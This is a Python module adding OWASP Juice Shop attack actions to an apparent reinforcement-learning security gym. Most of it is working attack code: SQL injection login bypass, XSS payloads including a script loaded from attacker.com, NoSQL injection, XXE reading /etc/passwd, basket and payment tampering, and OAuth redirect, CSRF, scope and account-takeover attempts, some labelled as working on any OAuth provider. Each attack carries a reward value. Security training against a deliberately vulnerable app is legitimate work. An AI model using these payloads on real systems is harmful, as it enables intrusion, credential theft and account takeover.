"""
OWASP Juice Shop Specific Environment Extension
================================================

Adds Juice Shop-specific endpoints, payloads, and attack methods
based on the official "Pwning OWASP Juice Shop" walkthrough.

This extends the base WebSecurityGym with Juice Shop-specific features.
"""

from typing import Tuple
import requests


class JuiceShopExtension:
    """Juice Shop-specific attack methods and endpoints."""

    # Juice Shop specific endpoints
    JUICE_ENDPOINTS = {
        "api_users": "/api/Users",
        "api_login": "/rest/user/login",
        "api_basket": "/api/BasketItems",
        "api_products": "/api/Products",
        "api_reviews": "/api/Reviews",
        "api_feedback": "/api/Feedbacks",
        "api_complaints": "/api/Complaints",
        "api_orders": "/api/Orders",
        "api_delivery": "/api/Deliverys",
        "api_cards": "/api/Cards",
        "api_address": "/api/Addresss",
        "api_quantitys": "/api/Quantitys",
        "api_challenges": "/api/Challenges",
        "ftp": "/ftp",
        "redirect": "/redirect",
        "rest_admin": "/rest/admin/application-configuration",
        "rest_saveloginip": "/rest/saveLoginIp",
        "rest_basket": "/rest/basket",
        "rest_track_order": "/rest/track-order",
        "rest_continue_code": "/rest/continue-code",
        "rest_memories": "/rest/memories",
        "socket_io": "/socket.io",
        "video": "/video",
        "profile": "/profile",
        "accounting": "/accounting",
        "administration": "/administration",
        "about": "/#/about",
        "contact": "/#/contact",
        "scoreboard": "/#/score-board",
        "chatbot": "/#/chatbot",
        "deluxe": "/#/deluxe-membership",
        "photo_wall": "/#/photo-wall",
        "two_factor": "/#/2fa/enter",
    }

    # Known Juice Shop users (from walkthrough)
    KNOWN_USERS = {
        "admin": "admin@juice-sh.op",
        "bender": "bender@juice-sh.op",
        "jim": "jim@juice-sh.op",
        "mc_safe": "mc.safesearch@juice-sh.op",
        "accountant": "accountant@juice-sh.op",  # Non-existing user for SQL injection
    }

    # Juice Shop specific SQL injection payloads
    JUICE_SQL_PAYLOADS = [
        # Admin login bypass
        "' OR 1=1--",
        "admin'--",
        "' OR '1'='1",
        # User enumeration
        "' UNION SELECT * FROM Users--",
        "' UNION SELECT email, password FROM Users--",
        # Schema extraction
        "' UNION SELECT sql FROM sqlite_master--",
        # Sleep injection
        "'; SELECT SLEEP(5)--",
        "1'; WAITFOR DELAY '00:00:05'--",
        # Blind SQL injection
        "' AND '1'='1",
        "' AND '1'='2",
        # Order manipulation
        "')) OR true--",
    ]

    # Juice Shop XSS payloads
    JUICE_XSS_PAYLOADS = [
        # DOM XSS
        '<iframe src="javascript:alert(`xss`)">',
        "<img src=x onerror=alert('XSS')>",
        # Reflected XSS
        "<script>alert('XSS')</script>",
        # Stored XSS in reviews
        '<iframe src="javascript:alert(`xss`)" onload="this.src+=\'\'">',
        # Video XSS
        '<<script>Foo</script>iframe src="javascript:alert(`xss`)">',
        # CSP bypass
        '<script src="http://attacker.com/evil.js"></script>',
    ]

    # NoSQL injection payloads (for reviews)
    NOSQL_PAYLOADS = [
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$regex": ".*"}',
    ]

    def __init__(self, session: requests.Session, target_url: str):
        self.session = session
        self.target_url = target_url.rstrip("/")

    def attack_juice_admin_login(self) -> Tuple[requests.Response, float]:
        """
        Log in as admin using SQL injection.
        Challenge: "Log in with the administrator's user account"
        """
        url = f"{self.target_url}{self.JUICE_ENDPOINTS['api_login']}"

        # Try SQL injection to bypass authentication
        payloads = [
            {"email": "admin@juice-sh.op'--", "password": "anything"},
            {"email": "' OR 1=1--", "password": "anything"},
            {"email": "admin@juice-sh.op", "password": "' OR '1'='1"},
        ]

        for payload in payloads:
            try:
                r = self.session.post(url, json=payload, timeout=3)
                if r.status_code == 200 and "token" in r.text.lower():
                    return r, 100.0  # High reward for admin access
            except:
                pass

        # Fallback: try default credentials
        r = self.session.post(
            url, json={"email": "admin@juice-sh.op", "password": "admin123"}, timeout=3
        )
        return r, -5.0

    def attack_juice_basket_manipulation(self) -> Tuple[requests.Response, float]:
        """
        Manipulate basket to get items for free or negative price.
        Challenge: "Put an additional product into another user's shopping basket"
        """
        url = f"{self.target_url}{self.JUICE_ENDPOINTS['api_basket']}"

        # Try to add item with negative quantity or price
        payloads = [
            {"ProductId": 1, "BasketId": "1", "quantity": -1},
            {"ProductId": 1, "BasketId": "2", "quantity": 1},  # Other user's basket
        ]

        for payload in payloads:
            try:
                r = self.session.post(url, json=payload, timeout=3)
                if r.status_code in [200, 201]:
                    return r, 80.0  # Business logic bypass
            except:
                pass

        r = self.session.get(url, timeout=3)
        return r, -2.0

    def attack_juice_deluxe_fraud(self) -> Tuple[requests.Response, float]:
        """
        Get deluxe membership without paying.
        Challenge: "Obtain a Deluxe Membership without paying for it"
        """
        url = f"{self.target_url}{self.JUICE_ENDPOINTS['api_delivery']}"

        # Try to manipulate payment
        try:
            r = self.session.post(
                url, json={"paymentMode": "deluxe", "price": 0}, timeout=3
            )
            if r.status_code in [200, 201]:
                return r, 90.0
        except:
            pass

        return (
            self.session.get(
                f"{self.target_url}{self.JUICE_ENDPOINTS['deluxe']}", timeout=3
            ),
            -2.0,
        )

    def attack_juice_video_xss(self) -> Tuple[requests.Response, float]:
        """
        XSS attack on video subtitles.
        Challenge: "Perform a persisted XSS attack bypassing a CSP"
        """
        url = f"{self.target_url}{self.JUICE_ENDPOINTS['video']}"

        xss_payload = '<<script>Foo</script>iframe src="javascript:alert(`xss`)">'

        try:
            r = self.session.get(url, params={"subtitle": xss_payload}, timeout=3)
            if r.status_code == 200:
                return r, 85.0
        except:
            pass

        return self.session.get(url, timeout=3), -2.0

    def attack_juice_review_nosql(self) -> Tuple[requests.Response, float]:
        """
        NoSQL injection in product reviews.
        Challenge: "Update multiple product reviews at the same time"
        """
        url = f"{self.target_url}{self.JUICE_ENDPOINTS['api_reviews']}"

        # Try NoSQL injection
        nosql_payload = {"$ne": None}

        try:
            r = self.session.patch(
                url, json={"id": nosql_payload, "message": "Hacked"}, timeout=3
            )
            if r.status_code in [200, 201]:
                return r, 95.0
        except:
            pass

        return self.session.get(url, timeout=3), -2.0

    def attack_juice_ftp_access(self) -> Tuple[requests.Response, float]:
        """
        Access FTP directory with sensitive files.
        Challenge: "Access a confidential document"
        """
        url = f"{self.target_url}{self.JUICE_ENDPOINTS['ftp']}"

        # Try to access FTP directory
        sensitive_files = [
            "acquisitions.md",
            "coupons_2013.md.bak",
            "package.json.bak",
            "suspicious_errors.yml",
        ]

        for file in sensitive_files:
            try:
                r = self.session.get(f"{url}/{file}", timeout=3)
                if r.status_code == 200:
                    return r, 70.0
            except:
                pass

        return self.session.get(url, timeout=3), -2.0

    def attack_juice_redirect_exploit(self) -> Tuple[requests.Response, float]:
        """
        Open redirect vulnerability.
        Challenge: "Enforce a redirect to a page you are not supposed to redirect to"
        """
        url = f"{self.target_url}{self.JUICE_ENDPOINTS['redirect']}"

        # Try open redirect
        malicious_urls = [
            "https://github.com/juice-shop/juice-shop",
            "https://owasp.org",
            "javascript:alert('XSS')",
        ]

        for mal_url in malicious_urls:
            try:
                r = self.session.get(
                    url, params={"to": mal_url}, timeout=3, allow_redirects=False
                )
                if r.status_code in [301, 302] and mal_url in r.headers.get(
                    "Location", ""
                ):
                    return r, 75.0
            except:
                pass

        return self.session.get(url, timeout=3), -2.0

    def attack_juice_xxe_complaint(self) -> Tuple[requests.Response, float]:
        """
        XXE attack via file upload in complaint form.
        Challenge: "Retrieve the content of C:\\Windows\\system.ini or /etc/passwd"
        """
        url = f"{self.target_url}{self.JUICE_ENDPOINTS['api_complaints']}"

        xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<complaint>
  <message>&xxe;</message>
</complaint>"""

        try:
            r = self.session.post(
                url,
                data=xxe_payload,
                headers={"Content-Type": "application/xml"},
                timeout=3,
            )
            if r.status_code == 200 and ("root:" in r.text or "system.ini" in r.text):
                return r, 100.0
        except:
            pass

        return self.session.get(url, timeout=3), -2.0

    def attack_juice_scoreboard_discovery(self) -> Tuple[requests.Response, float]:
        """
        Find the hidden scoreboard.
        Challenge: "Find the carefully hidden 'Score Board' page"
        """
        url = f"{self.target_url}{self.JUICE_ENDPOINTS['scoreboard']}"

        try:
            r = self.session.get(url, timeout=3)
            if r.status_code == 200 and "score" in r.text.lower():
                return r, 50.0  # Easy challenge
        except:
            pass

        return r, -2.0

    def attack_juice_admin_section(self) -> Tuple[requests.Response, float]:
        """
        Access the administration section.
        Challenge: "Access the administration section of the store"
        """
        url = f"{self.target_url}{self.JUICE_ENDPOINTS['administration']}"

        try:
            r = self.session.get(url, timeout=3)
            if r.status_code == 200:
                return r, 60.0
        except:
            pass

        return r, -2.0

    def attack_oauth_redirect_uri_bypass(self) -> Tuple[requests.Response, float]:
        """
        Manipulate redirect_uri in OAuth flow to steal authorization codes.
        Challenge: "Exploit OAuth redirect_uri validation"
        Works on: Google OAuth, Facebook Login, GitHub OAuth, any OAuth 2.0 implementation
        """
        # Common OAuth endpoints
        oauth_endpoints = [
            "/rest/user/login",
            "/oauth/authorize",
            "/auth/google",
            "/auth/facebook",
            "/login/oauth/authorize",
        ]

        # Redirect URI manipulation payloads
        malicious_redirects = [
            "https://attacker.com/callback",
            f"{self.target_url}@attacker.com",
            f"{self.target_url}/../../../attacker.com",
            f"{self.target_url}.attacker.com",
            "https://attacker.com?url={self.target_url}",
            "javascript:alert('XSS')",
        ]

        for endpoint in oauth_endpoints:
            url = f"{self.target_url}{endpoint}"
            for redirect in malicious_redirects:
                try:
                    r = self.session.get(
                        url,
                        params={
                            "redirect_uri": redirect,
                            "client_id": "test",
                            "response_type": "code",
                        },
                        timeout=3,
                        allow_redirects=False,
                    )

                    # Check if redirect was accepted
                    if r.status_code in [301, 302, 303, 307, 308]:
                        location = r.headers.get("Location", "")
                        if "attacker" in location or redirect in location:
                            return r, 90.0  # High reward for redirect URI bypass
                except:
                    pass

        return self.session.get(f"{self.target_url}/oauth/authorize", timeout=3), -2.0

    def attack_oauth_state_csrf(self) -> Tuple[requests.Response, float]:
        """
        CSRF attack via missing or predictable state parameter in OAuth.
        Challenge: "Perform CSRF attack on OAuth flow"
        Works on: Any OAuth implementation with weak state validation
        """
        url = f"{self.target_url}/oauth/authorize"

        # Try OAuth without state parameter (CSRF vulnerability)
        try:
            r = self.session.get(
                url,
                params={
                    "client_id": "test",
                    "redirect_uri": f"{self.target_url}/callback",
                    "response_type": "code",
                    # Missing 'state' parameter = CSRF vulnerability
                },
                timeout=3,
            )

            if r.status_code == 200 or "code=" in r.text:
                return r, 85.0  # OAuth CSRF vulnerability
        except:
            pass

        # Try with predictable state
        try:
            r = self.session.get(
                url,
                params={
                    "client_id": "test",
                    "redirect_uri": f"{self.target_url}/callback",
                    "response_type": "code",
                    "state": "12345",  # Predictable state
                },
                timeout=3,
            )

            if r.status_code == 200:
                return r, 70.0
        except:
            pass

        return self.session.get(url, timeout=3), -2.0

    def attack_oauth_token_theft(self) -> Tuple[requests.Response, float]:
        """
        Steal OAuth access tokens from insecure callback handling.
        Challenge: "Intercept OAuth tokens from callback"
        Works on: OAuth implementations that leak tokens in URL/referer
        """
        # Try to access OAuth callback with token in URL
        callback_urls = [
            "/oauth/callback?code=STOLEN_CODE",
            "/auth/callback?access_token=STOLEN_TOKEN",
            "/login/callback?token=STOLEN",
        ]

        for callback in callback_urls:
            url = f"{self.target_url}{callback}"
            try:
                r = self.session.get(url, timeout=3)

                # Check if token is accepted without validation
                if r.status_code == 200 and (
                    "success" in r.text.lower() or "logged" in r.text.lower()
                ):
                    return r, 95.0  # Token theft successful
            except:
                pass

        return self.session.get(f"{self.target_url}/oauth/callback", timeout=3), -2.0

    def attack_oauth_scope_escalation(self) -> Tuple[requests.Response, float]:
        """
        Request excessive OAuth scopes to gain unauthorized permissions.
        Challenge: "Escalate OAuth permissions beyond intended scope"
        Works on: OAuth APIs with poor scope validation
        """
        url = f"{self.target_url}/oauth/authorize"

        # Try to request admin/excessive scopes
        excessive_scopes = [
            "admin read write delete",
            "user:admin repo:admin",
            "full_access root superuser",
            "*",  # Wildcard scope
        ]

        for scope in excessive_scopes:
            try:
                r = self.session.get(
                    url,
                    params={
                        "client_id": "test",
                        "redirect_uri": f"{self.target_url}/callback",
                        "response_type": "code",
                        "scope": scope,
                    },
                    timeout=3,
                )

                if r.status_code == 200 and scope in r.text:
                    return r, 80.0  # Scope escalation possible
            except:
                pass

        return self.session.get(url, timeout=3), -2.0

    def attack_oauth_account_takeover(self) -> Tuple[requests.Response, float]:
        """
        Pre-account takeover via OAuth account linking.
        Challenge: "Takeover account via OAuth linking vulnerability"
        Works on: Apps with insecure OAuth account linking
        """
        # Try to link OAuth account without proper verification
        link_url = f"{self.target_url}/rest/user/link-oauth"

        payloads = [
            {"provider": "google", "oauth_id": "attacker@gmail.com"},
            {"provider": "facebook", "oauth_id": "123456789"},
            {"email": "victim@example.com", "oauth_provider": "google"},
        ]

        for payload in payloads:
            try:
                r = self.session.post(link_url, json=payload, timeout=3)

                if r.status_code in [200, 201] and "success" in r.text.lower():
                    return r, 100.0  # Account takeover via OAuth
            except:
                pass

        return self.session.get(f"{self.target_url}/profile", timeout=3), -2.0


# Action IDs for Juice Shop specific attacks (60-74)
JUICE_SHOP_ACTIONS = {
    60: "attack_juice_admin_login",
    61: "attack_juice_basket_manipulation",
    62: "attack_juice_deluxe_fraud",
    63: "attack_juice_video_xss",
    64: "attack_juice_review_nosql",
    65: "attack_juice_ftp_access",
    66: "attack_juice_redirect_exploit",
    67: "attack_juice_xxe_complaint",
    68: "attack_juice_scoreboard_discovery",
    69: "attack_juice_admin_section",
    # OAuth/SSO Attacks (70-74)
    70: "attack_oauth_redirect_uri_bypass",
    71: "attack_oauth_state_csrf",
    72: "attack_oauth_token_theft",
    73: "attack_oauth_scope_escalation",
    74: "attack_oauth_account_takeover",
}
